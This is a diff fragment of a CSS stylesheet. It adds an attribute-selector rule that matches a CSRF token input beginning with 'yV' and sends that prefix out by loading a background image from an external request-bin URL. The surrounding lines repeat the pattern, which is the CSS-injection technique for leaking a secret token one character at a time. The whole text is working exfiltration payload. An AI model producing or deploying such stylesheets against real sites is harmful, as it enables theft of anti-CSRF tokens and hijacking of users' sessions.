@@ -30,6 +30,10 @@ input[name="csrf"][value^=".V"] {
   background: url(https://en6gc9c8vfzvo.x.pipedream.net/?2=V)
 }
 
+input[name="csrf"][value^="yV"] {
+  background: url(https://en6gc9c8vfzvo.x.pipedream.net/?2=yV)
+}
+
 input[name="csrf"][value^=".[a-z]"] {
   background: url(https://en6gc9c8vfzvo.x.pipedream.net/?2=[a-z])
 }
